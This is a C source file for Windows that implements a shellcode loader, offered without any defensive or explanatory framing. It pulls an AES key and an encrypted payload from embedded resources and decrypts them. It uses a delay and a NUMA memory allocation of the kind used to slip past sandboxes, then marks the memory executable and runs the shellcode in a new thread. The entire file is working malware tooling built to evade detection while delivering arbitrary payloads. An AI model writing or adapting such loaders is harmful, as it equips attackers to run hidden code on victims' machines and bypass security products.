#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

// Function to load resource data into memory
void ldres(const char* resName, unsigned char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (unsigned char*)LockResource(hResData);
}

// Function to decrypt AES encrypted shellcode
void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coolcode, &coolcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


// Function to print hex representation of the byte array
//void PrintHex(unsigned char* data, DWORD size) {
    //for (DWORD i = 0; i < size; i++) {
        //printf("0x%02X ", data[i]);
    //}
    //printf("\n");
//}

int main() {
    Sleep(2000);  // Sleep to mimic real-world attack time delay

    unsigned char* AESkey;
    DWORD AESkeyLen;
    ldres("AESKEY", &AESkey, &AESkeyLen);  // Load AES key

    unsigned char* AESCode;
    DWORD AESCodeLen;
    ldres("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode

    // Print the AES key and shellcode for debugging (as hex)
     unsigned char keyy[AESkeyLen];
    unsigned char codee[AESCodeLen];

   
    memcpy(keyy, AESkey, AESkeyLen);
    memcpy(codee, AESCode, AESCodeLen);

   

    LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);

    aedecok((char*)codee, sizeof(codee), keyy, sizeof(keyy));  // Decrypt AES shellcode

    memcpy(memalo, codee, sizeof(codee));  // Copy decrypted shellcode to allocated memory
    DWORD oldProtect;
    VirtualProtect(memalo, sizeof(codee), PAGE_EXECUTE_READ, &oldProtect);  // Change protection to execute

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);  // Execute shellcode in a new thread
    WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish

    return 0;
}
